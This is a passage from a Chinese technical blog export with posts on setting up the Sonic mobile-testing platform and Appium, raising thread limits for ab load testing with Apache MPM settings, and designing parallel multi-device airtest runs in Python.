<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\sonic\sonic-server-v1.5.0-beta&gt;docker-compose up -d</span><br><span class="line">sonic-server-v150-beta_sonic-server-eureka_1 is up-to-date</span><br><span class="line">sonic-server-v150-beta_sonic-server-controller_1 is up-to-date</span><br><span class="line">sonic-server-v150-beta_sonic-server-gateway_1 is up-to-date</span><br><span class="line">sonic-server-v150-beta_sonic-client-web_1 is up-to-date</span><br><span class="line">Creating sonic-server-v150-beta_sonic-server-folder_1 ... done                                                          </span><br></pre></td></tr></table></figure>

<ul>
<li>打开<code>http://localhost:3000/</code>，注册后，自动登录</li>
</ul>
<p><img src="/aposts/f586e041/image-20220824095329636.png" alt="image-20220824095329636"></p>
<h2 id="Sonic配置"><a href="#Sonic配置" class="headerlink" title="Sonic配置"></a>Sonic配置</h2><h3 id="本机环境-java"><a href="#本机环境-java" class="headerlink" title="本机环境-java"></a>本机环境-java</h3><ul>
<li>下载并配置Java，我的版本为</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;java -version</span><br><span class="line">java version &quot;17.0.2&quot; 2022-01-18 LTS</span><br><span class="line">Java(TM) SE Runtime Environment (build 17.0.2+8-LTS-86)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 17.0.2+8-LTS-86, mixed mode, sharing)</span><br></pre></td></tr></table></figure>

<h3 id="appium安装"><a href="#appium安装" class="headerlink" title="appium安装"></a>appium安装</h3><p>下载<a href="https://www.androiddevtools.cn/">android sdk tools</a>，选择exe文件安装后，并打开</p>
<p><img src="/aposts/f586e041/image-20220824103828375.png" alt="image-20220824103828375"></p>
<ul>
<li>因为用于 <strong>Appium</strong> 自动化，只需要勾选下面的 <strong>4</strong> 个包就行了，需要挂梯子</li>
</ul>
<p><img src="/aposts/f586e041/image-20220824104049673.png" alt="image-20220824104049673"></p>
<p><img src="/aposts/f586e041/image-20220824104117977.png" alt="image-20220824104117977"></p>
<ul>
<li>创建<code>ANDROID_HOME</code>的环境变量：<code>D:\app\android-sdk</code></li>
<li>SDK的platform-tools和tool的路径添加到<code>Path</code> 变量内<code> %ANDROID_HOME%\platform-tools</code>、<code>%ANDROID_HOME%\tools</code>、<code>%ANDROID_HOME%\build-tools\29.0.2</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;adb version</span><br><span class="line">Android Debug Bridge version 1.0.41</span><br><span class="line">Version 29.0.6-6198805</span><br><span class="line">Installed as D:\app\android-sdk\platform-tools\adb.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>下载并安装node.js</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator@WIN-5TF67LA12I4 MINGW64 /d/app/node-v14.20.0-win-x64</span><br><span class="line">$ npm -v</span><br><span class="line">6.14.17</span><br><span class="line"></span><br><span class="line">Administrator@WIN-5TF67LA12I4 MINGW64 /d/app/node-v14.20.0-win-x64</span><br><span class="line">$ node -v</span><br><span class="line">v14.20.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>安装appium，采用npm，尝试过了用cnpm经常报错，使用git的命令窗口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm cache clear --force # 清空缓存，如果报错的话，可以</span><br><span class="line"># 挂了代理，在git窗口中设置了代理</span><br><span class="line">export https_proxy=http://127.0.0.1:33210 http_proxy=http://127.0.0.1:33210 all_proxy=socks5://127.0.0.1:33211</span><br><span class="line"></span><br><span class="line">npm i -g appium  </span><br></pre></td></tr></table></figure>

<ul>
<li>装doctor，用来检查appium是否正常</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm install appium-doctor -g</span><br><span class="line">npm WARN deprecated authorize-ios@1.2.1: Moved into appium</span><br><span class="line">npm WARN deprecated debug@4.1.1: Debug versions &gt;=3.2.0 &lt;3.2.7 || &gt;=4 &lt;4.3.1 have a low-severity ReDos regression when used in a Node.js environment. It is recommended you upgrade to 3.2.7 or 4.3.1. (https://github.com/visionmedia/debug/issues/797)</span><br><span class="line">D:\app\node-v14.20.0-win-x64\appium-doctor -&gt; D:\app\node-v14.20.0-win-x64\node_modules\appium-doctor\appium-doctor.js</span><br><span class="line">+ appium-doctor@1.16.0</span><br><span class="line">added 240 packages from 297 contributors in 74.211s</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>检查appium，执行<code>./appium-doctor</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator@WIN-5TF67LA12I4 MINGW64 /d/app/node-v14.20.0-win-x64</span><br><span class="line">$ ./appium-doctor</span><br><span class="line">info AppiumDoctor Appium Doctor v.1.16.0</span><br><span class="line">info AppiumDoctor ### Diagnostic for necessary dependencies starting ###</span><br><span class="line">info AppiumDoctor  ✔ The Node.js binary was found at: D:\app\node-v14.20.0-win-x64\node.EXE</span><br><span class="line">info AppiumDoctor  ✔ Node version is 14.20.0</span><br><span class="line">info AppiumDoctor  ✔ ANDROID_HOME is set to: D:\app\android-sdk</span><br><span class="line">info AppiumDoctor  ✔ JAVA_HOME is set to: D:\app\Java\jdk-17.0.2</span><br><span class="line">info AppiumDoctor    Checking adb, android, emulator</span><br><span class="line">info AppiumDoctor      &#x27;adb&#x27; is in D:\app\android-sdk\platform-tools\adb.exe</span><br><span class="line">info AppiumDoctor      &#x27;android&#x27; is in D:\app\android-sdk\tools\android.bat</span><br><span class="line">info AppiumDoctor      &#x27;emulator&#x27; is in D:\app\android-sdk\tools\emulator.exe</span><br><span class="line">info AppiumDoctor  ✔ adb, android, emulator exist: D:\app\android-sdk</span><br><span class="line">info AppiumDoctor  ✔ &#x27;bin&#x27; subfolder exists under &#x27;D:\app\Java\jdk-17.0.2&#x27;</span><br><span class="line">info AppiumDoctor ### Diagnostic for necessary dependencies completed, no fix needed. ###</span><br><span class="line">info AppiumDoctor</span><br><span class="line">info AppiumDoctor ### Diagnostic for optional dependencies starting ###</span><br><span class="line">WARN AppiumDoctor  ✖ opencv4nodejs cannot be found.</span><br><span class="line">WARN AppiumDoctor  ✖ ffmpeg cannot be found</span><br><span class="line">WARN AppiumDoctor  ✖ mjpeg-consumer cannot be found.</span><br><span class="line">WARN AppiumDoctor  ✖ bundletool.jar cannot be found</span><br><span class="line">WARN AppiumDoctor  ✖ gst-launch-1.0.exe and/or gst-inspect-1.0.exe cannot be found</span><br><span class="line">info AppiumDoctor ### Diagnostic for optional dependencies completed, 5 fixes possible. ...</span><br><span class="line"></span><br><span class="line">info AppiumDoctor Bye! </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>直接输入<code>appium</code> 启动，没问题后就可以关闭了，不要手动去启动appium</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator@WIN-5TF67LA12I4 MINGW64 /d/app/node-v14.20.0-win-x64</span><br><span class="line">$ appium</span><br><span class="line">[Appium] Welcome to Appium v1.22.3</span><br><span class="line">[Appium] Appium REST http interface listener started on 0.0.0.0:4723</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>安装adbkit，用adb进行调试</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i -g adbkit</span><br></pre></td></tr></table></figure>

<h3 id="sonic文件配置"><a href="#sonic文件配置" class="headerlink" title="sonic文件配置"></a>sonic文件配置</h3><ul>
<li>新增angent</li>
</ul>
<p><img src="/aposts/f586e041/image-20220824174006767.png" alt="image-20220824174006767"></p>
<ul>
<li><p>打开<a href="https://download.sonic-cloud.wiki/sonic/sonic-agent/v1.5.0-beta">官网</a>下载<code>sonic-agent-v1.5.0-beta-windows_x86_64</code>解压</p>
</li>
<li><p>打开配置文件，我的路径为：<code>D:\sonic\sonic-agent-v1.5.0-beta-windows_x86_64\config\application-sonic-agent.yml</code></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sonic:</span><br><span class="line">  agent:</span><br><span class="line">    # 替换为部署Agent机器的ipv4</span><br><span class="line">    host: 172.31.104.166</span><br><span class="line">    # 替换为Agent服务的端口，可以自行更改</span><br><span class="line">    port: 7777</span><br><span class="line">    # 替换为前端新增Agent生成的key</span><br><span class="line">    key: XXXXXX</span><br><span class="line">  server:</span><br><span class="line">    # 改成server的SONIC_SERVER_HOST</span><br><span class="line">    host: 172.31.104.166</span><br><span class="line">    # 改成server的SONIC_SERVER_PORT</span><br><span class="line">    port: 3000</span><br><span class="line"></span><br><span class="line">modules:</span><br><span class="line">  android:</span><br><span class="line">    # 是否开启安卓模块</span><br><span class="line">    enable: true</span><br><span class="line">    # 是否开启远程adb调试功能</span><br><span class="line">    use-adbkit: true</span><br><span class="line">  ios:</span><br><span class="line">    # 如果不需要连接iOS设备，请将true改为false。开启的windows用户请确保本机已安装iTunes</span><br><span class="line">    enable: false</span><br><span class="line">    # 替换为你自己使用的wda的bundleId，如果没有.xctrunner后缀会自动补全，建议使用公司的开发者证书</span><br><span class="line">    wda-bundle-id: com.sonic.WebDriverAgentRunner</span><br><span class="line">  appium:</span><br><span class="line">    # 是否开启Appium功能</span><br><span class="line">    enable: true</span><br><span class="line">  webview:</span><br><span class="line">    # 是否开启在线webView调试功能</span><br><span class="line">    enable: false</span><br><span class="line">    # 谷歌调试端口，一般不需要修改（默认0使用随机端口，如果需要开启防火墙给外部使用，请设置固定端口如7778）</span><br><span class="line">    chrome-driver-debug-port: 0</span><br><span class="line">    # 替换为Agent机器上的chrome浏览器的driver路径，可以去http://npm.taobao.org/mirrors/chromedriver/下载</span><br><span class="line">    chrome-driver-path: &quot;/Applications/Google Chrome.app/Contents/MacOS/chromedriver&quot;</span><br><span class="line">  sgm:</span><br><span class="line">    enable: true</span><br></pre></td></tr></table></figure>

<ul>
<li>启动agent</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\sonic\sonic-agent-v1.5.0-beta-windows_x86_64&gt;java -jar sonic-agent-windows-x86_64.jar</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/f586e041/image-20220824174158573.png" alt="image-20220824174158573"></p>
<ul>
<li>手机打开开发者模式后，连接电脑（agent）后，打开web页面的设备</li>
</ul>
<p><img src="/aposts/f586e041/image-20220824175641741.png" alt="image-20220824175641741"></p>
<h2 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h2><h3 id="sonic的配置"><a href="#sonic的配置" class="headerlink" title="sonic的配置"></a>sonic的配置</h3><ul>
<li>新建项目，点击项目</li>
</ul>
<p><img src="/aposts/f586e041/image-20220824175944576.png" alt="image-20220824175944576"></p>
<ul>
<li>打开设备中心，选择空闲设备，选择使用</li>
</ul>
<p><img src="/aposts/f586e041/image-20220824180220297.png" alt="image-20220824180220297"></p>
<p><img src="/aposts/f586e041/image-20220824180249666.png" alt="image-20220824180249666"></p>
<ul>
<li>点击控件元素，获取到元素后，直接添加控件</li>
</ul>
<p><img src="/aposts/f586e041/image-20220826085653821.png" alt="image-20220826085653821"></p>
<p><img src="/aposts/f586e041/image-20220826085812310.png" alt="image-20220826085812310"></p>
<ul>
<li><p>用例的步骤关联-上面的控件元素</p>
</li>
<li><p>套件关联多个用例</p>
</li>
<li><p>查看测试报告</p>
</li>
</ul>
<p><img src="/aposts/f586e041/image-20220826094320795.png" alt="image-20220826094320795"></p>
<ul>
<li>支持多个设备同时运行所有用例</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>优点：远程的手机管理，统一的用例维护，多机运行用例。</p>
</li>
<li><p>不足</p>
<ul>
<li>不支持分布式用例</li>
<li>用例查找不支持显示等待，这个问题需要等后续的版本脱离appium后，可以处理</li>
</ul>
</li>
<li><p>已经支持使用poco的控件的获取，这对游戏应用来说，是个很好的消息。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Sonic</category>
      </categories>
      <tags>
        <tag>Sonic</tag>
        <tag>自动化测试</tag>
      </tags>
  </entry>
  <entry>
    <title>ab压力测试-突破最大线程数</title>
    <url>/aposts/4d250642/</url>
    <content><![CDATA[<blockquote>
<p><a href="http://www.jianshu.com/p/166a4ea8aade">ab压力测试中，发现你一次最多只能启动1024个线程</a></p>
</blockquote>
<ul>
<li>默认情况下，一个线程的栈要预留1M的内存空间<br>而一个进程中可用的内存空间只有2G，所以理论上一个进程中最多可以开2048个线程</li>
<li>但是内存当然不可能完全拿来作线程的栈，所以实际数目要比这个值要小。你也可以通过连接时修改默认栈大小，将其改的比较小，这样就可以多开一些线程。如将默认栈的大小改成512K，这样理论上最多就可以开4096个线程。即使物理内存再大，一个进程中可以起的线程总要受到2GB这个内存空间的限制。</li>
<li>比方说你的机器装了64GB物理内存，但每个进程的内存空间还是4GB，其中用户态可用的还是2GB。<ul>
<li>内核态. CPU可以访问内存所有数据, 包括外围设备, 例如硬盘, 网卡. CPU也可以将自己从一个程序切换到另一个程序</li>
<li>用户态:.只能受限的访问内存, 且不允许访问外围设备. 占用CPU的能力被剥夺, CPU资源可以被其他程序获取</li>
</ul>
</li>
<li>如果是同一台机器内的话，能起多少线程也是受内存限制的。每个线程对象都要站用非页面内存，而非页面内存也是有限的，当非页面内存被耗尽时，也就无法创建线程了。</li>
<li>如果物理内存非常大，同一台机器内可以跑的线程数目的限制值会越来越大。在Windows下写个程序，一个进程Fork出2000个左右线程就会异常退出了，为什么？这个问题的产生是因为windows32位系统，一个进程所能使用的最大虚拟内存为2G，而一个线程的默认线程栈StackSize为1024K（1M），这样当线程数量逼近2000时，2000*1024K&#x3D;2G（大约），内存资源就相当于耗尽</li>
</ul>
<h1 id="影响最大线程大小的因素"><a href="#影响最大线程大小的因素" class="headerlink" title="影响最大线程大小的因素"></a>影响最大线程大小的因素</h1><ul>
<li>Java虚拟机本身<ul>
<li>Xms 初始堆大小</li>
<li>Xmx 最大堆大小</li>
<li>Xss 每个线程的堆栈大小</li>
</ul>
</li>
<li>系统限制<ul>
<li>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max</li>
<li>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;thread-max</li>
<li>max_user_process（ulimit -u）</li>
<li>&#x2F;proc&#x2F;sys&#x2F;vm&#x2F;max_map_count</li>
</ul>
</li>
</ul>
<h1 id="其他突破线程问题"><a href="#其他突破线程问题" class="headerlink" title="其他突破线程问题"></a>其他突破线程问题</h1><ul>
<li>多进程-启动多线程</li>
<li>使用异步请求<ul>
<li>无论是使用多进程-多线程，还是异步请求，最主要的影响还是电脑本身的配置</li>
</ul>
</li>
</ul>
<h2 id="下面是具体配置"><a href="#下面是具体配置" class="headerlink" title="下面是具体配置"></a>下面是具体配置</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><code>httpd.exe -l </code>会看见 <code>mpm_winnt.c windows</code>默认执行 <code>mpm_winnt_module</code>方式 (暂未找到修改成其他方式的方法)</p>
<p>1.<code>httpd.conf</code> 文件去掉 <code>Include conf/extra/httpd-mpm.conf</code> 前面的#</p>
<p>2.修改<code>extra/httpd-mpm.conf</code> 最下面 或 查找 <code>mpm_winnt_module</code> 修改<code>ThreadsPerChild</code> 和 <code>MaxRequestsPerChild</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#每个子进程建立的线程数</span><br><span class="line">    ThreadsPerChild      1 默认150</span><br><span class="line"></span><br><span class="line">    #指令设置每个子进程在其生存期内允许伺服的最大请求数量。</span><br><span class="line">    #到达MaxRequestsPerChild的限制后，子进程将会结束。</span><br><span class="line">    #如果MaxRequestsPerChild为&quot;0&quot;，子进程将永远不会结束。</span><br><span class="line">    MaxRequestsPerChild    10  默认0</span><br></pre></td></tr></table></figure>

<p>根据自己网站并发数量设置:</p>
<ul>
<li><code>ThreadsPerChild</code> 设置 网站平均在线人数</li>
<li><code>MaxRequestsPerChild</code> 设置最高在线人数的值</li>
</ul>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul>
<li><p><code>ps -ef | grep httpd | wc -l </code>查看当前 httpd进程数</p>
</li>
<li><p><code>apachectl -l </code>会看见 prefork.c Linux默认执行 mpm_prefork_module</p>
</li>
<li><p><code>httpd.conf</code> 文件去掉 <code>Include conf/extra/httpd-mpm.conf </code>前面的#</p>
</li>
<li><p>修改<code>extra/httpd-mpm.conf</code> 最上面 或 查找 <code>mpm_prefork_module</code></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">StartServers          5 #默认启动线程数</span><br><span class="line"></span><br><span class="line">    #指令设置空闲子进程的最小数量。</span><br><span class="line">    #所谓空闲子进程是指没有正在处理请求的子进程。</span><br><span class="line">    #如果当前空闲子进程数少于MinSpareServers ，</span><br><span class="line">    #那么Apache将以最大每秒一个的速度产生新的子进程。</span><br><span class="line">    #只有在非常繁忙机器上才需要调整这个参数。将此参数设的太大通常是一个坏主意。</span><br><span class="line">    MinSpareServers       5 #</span><br><span class="line"></span><br><span class="line">    #指令设置空闲子进程的最大数量。</span><br><span class="line">    #所谓空闲子进程是指没有正在处理请求的子进程。</span><br><span class="line">    #如果当前有超过MaxSpareServers数量的空闲子进程，</span><br><span class="line">    #那么父进程将杀死多余的子进程。</span><br><span class="line">    #只有在非常繁忙机器上才需要调整这个参数。</span><br><span class="line">    #将此参数设的太大通常是一个坏主意。</span><br><span class="line">    #如果你将该指令的值设置为比MinSpareServers小，</span><br><span class="line">    #Apache将会自动将其修改成&quot;MinSpareServers+1&quot;。</span><br><span class="line">    MaxSpareServers      10 #</span><br><span class="line">    MaxClients          150 #apache可以同时处理的请求</span><br><span class="line">    MaxRequestsPerChild   0  #如windows MaxRequestsPerChild</span><br></pre></td></tr></table></figure>

<h1 id="其他参考"><a href="#其他参考" class="headerlink" title="其他参考"></a>其他参考</h1><ul>
<li><a href="http://jzhihui.iteye.com/blog/1271122">JVM中可生成的最大Thread数量</a></li>
<li><a href="http://www.cnblogs.com/zemliu/p/3695503.html">内核态(Kernel Mode)与用户态(User Mode)</a></li>
</ul>
]]></content>
      <categories>
        <category>性能测试</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>airtest多机并行设计解析</title>
    <url>/aposts/5a751e2b/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>前文介绍了<a href="https://moon-full.gitee.io/2022/01/18/aritest%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E8%AE%BE%E8%AE%A1/">aritest自动化测试框架设计</a>，这次分析下如何设计多机并行，本次测试是安卓手机，雷电模拟器和真机，谷歌浏览器</p>
<h2 id="多机安卓"><a href="#多机安卓" class="headerlink" title="多机安卓"></a>多机安卓</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><ul>
<li><p>setting.yml</p>
</li>
<li><p>和前文配置差不多，加了个<code>boot=multi</code></p>
<ul>
<li><p>只要设置此指，就会读取下面的值，里面给不同设备指定了不同模块</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">multi</span>]</span><br><span class="line"><span class="string">test_case</span> <span class="string">=</span> [&#123;<span class="string">&quot;dev&quot;</span><span class="string">:&quot;ZL9LC685V86DNNMN&quot;</span>,<span class="attr">&quot;test_module&quot;:</span> [<span class="string">&quot;我的&quot;</span>],<span class="string">&quot;phone&quot;</span><span class="string">:&quot;真机1&quot;</span>&#125;, &#123;<span class="string">&quot;dev&quot;</span><span class="string">:&quot;emulator-5554&quot;</span>,<span class="string">&quot;test_module&quot;</span><span class="string">:</span>[<span class="string">&quot;他的&quot;</span>],<span class="string">&quot;phone&quot;</span><span class="string">:&quot;雷电&quot;</span>&#125;]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line">[<span class="string">default</span>]</span><br><span class="line"><span class="comment"># 包名</span></span><br><span class="line"><span class="string">pkg</span> <span class="string">=</span> <span class="string">com.jianshu.haruki</span></span><br><span class="line"><span class="comment"># 手机名字</span></span><br><span class="line"><span class="string">phone=雷电模拟器</span></span><br><span class="line"><span class="comment"># 设备连接名字</span></span><br><span class="line"><span class="string">dev_connect=Android://127.0.0.1:5037/</span></span><br><span class="line"><span class="comment"># 设备id,adb devices 获取，如果启动多设备，这里无效</span></span><br><span class="line"><span class="string">dev=emulator-5554</span></span><br><span class="line"><span class="comment"># 用例目录</span></span><br><span class="line"><span class="string">root_path=E:\proj\airtest_auto\air_case\android</span></span><br><span class="line"> <span class="comment"># test_plan=1 表示调试用例需要配合test_module使用，0表示全部用例;如果启动多设备,test_plan默认为0,设置1也无效</span></span><br><span class="line"><span class="string">test_plan=1</span></span><br><span class="line"><span class="string">test_module=[&quot;他的&quot;]</span></span><br><span class="line"><span class="comment"># false|true 表示是否运行用例之前，删除log文件夹，删除后会影响查看历史报告</span></span><br><span class="line"><span class="string">remove_log=true</span></span><br><span class="line"><span class="comment"># false|true 是否开启录屏,若传true就会自动录屏，但是在模拟器上录屏失败，只使用于真机</span></span><br><span class="line"><span class="string">recording=false</span></span><br><span class="line"><span class="comment"># android|ios|web，当填如web时，需要填写驱动文件位置</span></span><br><span class="line"><span class="string">platform</span> <span class="string">=android</span></span><br><span class="line"><span class="comment"># driver_path=E:\proj\airtest_auto\exe\chromedriver.exe</span></span><br><span class="line"><span class="string">driver_path=</span></span><br><span class="line"><span class="comment"># 服务器信的信息，比如本地的ip，用来展示报告</span></span><br><span class="line"><span class="string">report_host=172.31.105.196</span></span><br><span class="line"><span class="comment"># 本地服务器路径，我把源代码中的report也放在里面了</span></span><br><span class="line"><span class="string">local_host_path=E:\proj\aritest</span></span><br><span class="line"><span class="comment"># 本地服务器端口</span></span><br><span class="line"><span class="string">local_host_port=8000</span></span><br><span class="line"><span class="comment"># 启动什么模式，单机和多机</span></span><br><span class="line"><span class="comment"># 如果指定multi就是多机并行，读取multi的配置，否则就为单机模式</span></span><br><span class="line"><span class="string">boot=multi</span></span><br><span class="line">[<span class="string">multi</span>]</span><br><span class="line"><span class="comment"># 给不同的设备分配测试模块,dev中的设备id一定要填对</span></span><br><span class="line"><span class="string">test_case</span> <span class="string">=</span> [&#123;<span class="string">&quot;dev&quot;</span><span class="string">:&quot;ZL9LC685V86DNNMN&quot;</span>,<span class="attr">&quot;test_module&quot;:</span> [<span class="string">&quot;我的&quot;</span>],<span class="string">&quot;phone&quot;</span><span class="string">:&quot;真机1&quot;</span>&#125;, &#123;<span class="string">&quot;dev&quot;</span><span class="string">:&quot;emulator-5554&quot;</span>,<span class="string">&quot;test_module&quot;</span><span class="string">:</span>[<span class="string">&quot;他的&quot;</span>],<span class="string">&quot;phone&quot;</span><span class="string">:&quot;雷电&quot;</span>&#125;]</span><br><span class="line"><span class="comment">#test_case = [&#123;&quot;dev&quot;:&quot;emulator-5554&quot;,&quot;test_module&quot;:[&quot;他的&quot;],&quot;phone&quot;:&quot;雷电&quot;&#125;]</span></span><br></pre></td></tr></table></figure>

<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>使用 <code>pool = Pool() pool.map(self.run_case1, data[&quot;test_case&quot;])</code>达到多进程并行设备</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## runner3.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动入口代码，和之前单机一样，读取配置文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_case</span>(<span class="params">data</span>):</span><br><span class="line">  	...</span><br><span class="line">    test = CustomAirtestCase(data[<span class="string">&quot;root_path&quot;</span>], data[<span class="string">&quot;dev_connect&quot;</span>])</span><br><span class="line">    test.run_air(data)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">run_air</span>(<span class="params">self, data</span>):</span><br><span class="line">        self.recording = data[<span class="string">&quot;recording&quot;</span>]</span><br><span class="line">        self.report_host = <span class="string">&quot;http://&quot;</span> + data[<span class="string">&quot;report_host&quot;</span>] + <span class="string">&quot;:&quot;</span> + data[<span class="string">&quot;local_host_port&quot;</span>]</span><br><span class="line">        <span class="comment"># 开启本地http服务器</span></span><br><span class="line">        threading.Thread(target=HttpServer.start, args=(),</span><br><span class="line">                         kwargs=&#123;<span class="string">&quot;local_host_path&quot;</span>: data[<span class="string">&quot;local_host_path&quot;</span>], <span class="string">&quot;report_host&quot;</span>: data[<span class="string">&quot;report_host&quot;</span>],<span class="string">&quot;port&quot;</span>: data[<span class="string">&quot;local_host_port&quot;</span>]&#125;).start()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 整个用例开始执行时间</span></span><br><span class="line">        start_time = datetime.now().strftime(<span class="string">&quot;%H:%M:%S&quot;</span>)</span><br><span class="line">        pool = Pool()</span><br><span class="line">        pool.<span class="built_in">map</span>(self.run_case1, data[<span class="string">&quot;test_case&quot;</span>])</span><br><span class="line">      	...</span><br><span class="line">        <span class="comment"># 记录数据采用放到json文件中</span></span><br><span class="line">        test_modules_dev = Runner3Common.get_case_module_dev(PATH(<span class="string">&quot;config/case_data.json&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;==设备=%s&quot;</span> % test_modules_dev)</span><br><span class="line">        Runner3Common.set_result_summary_json(&#123;<span class="string">&quot;total_time&quot;</span>: total_time, <span class="string">&quot;phone&quot;</span>: test_modules_dev[<span class="string">&quot;test_dev&quot;</span>], <span class="string">&quot;modules&quot;</span>: test_modules_dev[<span class="string">&quot;test_modules&quot;</span>]&#125;)</span><br><span class="line">      </span><br><span class="line"><span class="comment"># 不同的手机执行不同模块用例</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_case1</span>(<span class="params">self, data_item</span>):</span><br><span class="line">    _dev = data_item[<span class="string">&quot;dev&quot;</span>]</span><br><span class="line">    <span class="comment"># 记录测试设备</span></span><br><span class="line">    Runner3Common.set_case_module_dev(&#123;<span class="string">&quot;test_dev&quot;</span>: _dev&#125;)</span><br><span class="line">    <span class="comment"># 记录测试模块</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data_item[<span class="string">&quot;test_module&quot;</span>]:</span><br><span class="line">        <span class="comment"># 获取到用例列表</span></span><br><span class="line">        get_case_data = Runner3Common.get_cases(data_item, _dev, self.root_path)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> get_case_data:</span><br><span class="line">            air_device = [self.dev_connect + _dev]  <span class="comment"># 取设备</span></span><br><span class="line">            <span class="comment"># 执行用例</span></span><br><span class="line">            run(root_dir=self.root_path, test_case=i, device=air_device, local_host_path=self.local_host_path,log_date=self.log_date,</span><br><span class="line">                recording=self.recording, report_host=self.report_host, phone=data_item[<span class="string">&quot;phone&quot;</span>])</span><br><span class="line">     </span><br><span class="line"><span class="comment"># 执行用例这里代码和单机的代码相差不多，把 rpt = report.LogToHtml这里生成日志文件代码写在了这里</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">root_dir, test_case, device, local_host_path, log_date, recording, report_host, phone</span>):</span><br><span class="line">    script = os.path.join(root_dir, test_case[<span class="string">&quot;module&quot;</span>], test_case[<span class="string">&quot;case&quot;</span>])</span><br><span class="line">    log_host_path = os.path.join(test_case[<span class="string">&quot;module&quot;</span>], test_case[<span class="string">&quot;case&quot;</span>].replace(<span class="string">&#x27;.air&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    log = os.path.join(local_host_path, log_host_path)</span><br><span class="line">    os.makedirs(log)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(log) + <span class="string">&#x27; 创建日志文件成功&#x27;</span>)</span><br><span class="line">    output_file = os.path.join(log, <span class="string">&#x27;log.html&#x27;</span>)</span><br><span class="line">    args = Namespace(device=device, log=log, compress=<span class="literal">None</span>, recording=recording, script=script, no_image=<span class="literal">None</span>)</span><br><span class="line">    <span class="comment"># 用例开始执行日期</span></span><br><span class="line">    st_date = datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">    <span class="comment"># 用例开始执行时间</span></span><br><span class="line">    s_time = datetime.now().strftime(<span class="string">&quot;%H:%M:%S&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        run_script(args, AirtestCase)</span><br><span class="line">        is_success = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        is_success = <span class="literal">False</span></span><br><span class="line">    end_date = datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">    <span class="comment"># 用例结束执行时间</span></span><br><span class="line">    e_time = datetime.now().strftime(<span class="string">&quot;%H:%M:%S&quot;</span>)</span><br><span class="line">    <span class="comment"># 用例耗时时间</span></span><br><span class="line">    sum_time = get_case_total_time(s_time, e_time)</span><br><span class="line">    <span class="comment"># 生成测试用例的详情报告</span></span><br><span class="line">    rpt = report.LogToHtml(script, log, report_host + <span class="string">&quot;/report&quot;</span>,</span><br><span class="line">                           log_host=report_host + <span class="string">&quot;/log/&quot;</span> + log_date + <span class="string">&quot;/&quot;</span> + log_host_path)</span><br><span class="line"></span><br><span class="line">    rpt.report(<span class="string">&quot;log_template.html&quot;</span>, output_file=output_file)</span><br></pre></td></tr></table></figure>

